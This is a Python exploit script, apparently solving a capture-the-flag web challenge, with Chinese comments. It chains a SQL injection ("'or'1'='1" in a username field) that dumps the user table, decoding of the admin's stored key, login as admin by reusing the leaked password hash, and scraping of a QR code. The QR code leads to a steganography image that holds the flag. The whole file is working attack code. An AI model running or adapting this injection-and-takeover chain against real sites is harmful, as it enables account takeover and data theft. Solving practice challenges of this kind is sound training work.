import sys
import config
import requests
import hashlib,json
from lxml import html
from lxml import etree
import os
import re
import base64
from bs4 import BeautifulSoup
import wget
from pyzbar.pyzbar import decode
from PIL import Image

sys.path.append("..")

host = sys.argv[1]
port=sys.argv[2]
#port = int(sys.argv[2])

# host = config.host;
#目前在本地环境测试exp
url_register = "http://" + host + ":" + port + "/register"
url_login = "http://" + host + ":" + port + "/login"
url_index = "http://" + host + ":" + port + "/index"

def getshell():
    key=""
    admin_passwd_md5 =""
    session = ""
    username = "kate"
    passwd = "123"
    passwd = hashlib.md5(passwd.encode('utf8')).hexdigest()
    data = {"username":username,"passwd":passwd}
    res = requests.post(url=url_login,data=data)
    res = res.json()
    #print(res)
    if( res["status"] == 206):
        session = res["session"]
        print(username, "登陆成功，你的session是：",res["session"])
    else:
        print("登陆失败")
#访问index页面
#data = {"username":username,"passwd":passwd,"session":session}
#url_index = "http://" + host + ":5000/index?username="+username+"&passwd="+passwd+"&session="+session
#res = requests.get(url=url_index)
#print(res.text)
    url_myself = "http://" +host + ":" + port + "/myself"
    data = {"username":username+"'or'1'='1","passwd":passwd,"session":session}
    res = requests.post(url=url_myself,data=data)
    res = res.json()
    if res["status"] == 208:
        print("SQL注入成功，返回数据如下：")
        data = res["data"]
        for item in data:
            if item[1] == "admin":
                print("admin账号的信息：")
                print(item)
                print("关键key的值")
                key=item[4]
                key=base64.b64decode(key[4:])
                key=str(key,'utf8')
                print(key)
            #此处是使用彩虹表攻击的暴力过程
                admin_passwd = "passwd123"
                admin_passwd_md5 = item[2]
                if hashlib.md5(admin_passwd.encode('utf8')).hexdigest() == item[2]:
                    print("找到admin账户的密码：")
                    print(admin_passwd)

#使用admin账户登陆：
    username = "admin"
    data = {"username":username,"passwd":admin_passwd_md5,"session":session}
    res = requests.post(url=url_login,data=data)
    res = res.json()
    #print(res)
    if( res["status"] == 206):
        session = res["session"]
        print(username, "登陆成功，你的session是：",res["session"])
    else:
        print("登陆失败")

    url_admin_index = "http://"+host+":5000/user?username=admin&passwd="+admin_passwd_md5+"&session="+session
    res = requests.get(url=url_admin_index)
    s=etree.HTML(res.text)
    block= s.xpath('/html/body/div[1]/div/ul/li/div[2]/div/a/img/@src')
    print(block[0])
    QR_url = "http://"+host+":5000/"+ block[0]
    print("具有隐藏信息的图片是：")
    print(QR_url)

    cmd='mkdir pic'
    os.system(cmd)
    wget.download(QR_url,"pic/QR.png")
    qr="pic/QR.png"
    img = Image.open(qr)
    barcodes = decode(img)
    for barcode in barcodes:
        url = barcode.data.decode("utf-8")
        #print(url)

    res = requests.get(url).text 
    #print(res)
    doc = etree.HTML(res)
    resurl=doc.xpath('//*[@id="content"]/p[1]/img/@data-src')
    #print(resurl[0])
    wget.download(resurl[0],"pic/secret.jpg")

#Linux环境下取消以下注释实现解密
    #cmd='steghide extract -sf pic/secret.jpg -p %s'%(key)
    #os.system(cmd)
    #cmd='cat pic/sc.txt'
    #print("flag：")
    #os.system(cmd)


if __name__ == '__main__':
    getshell()
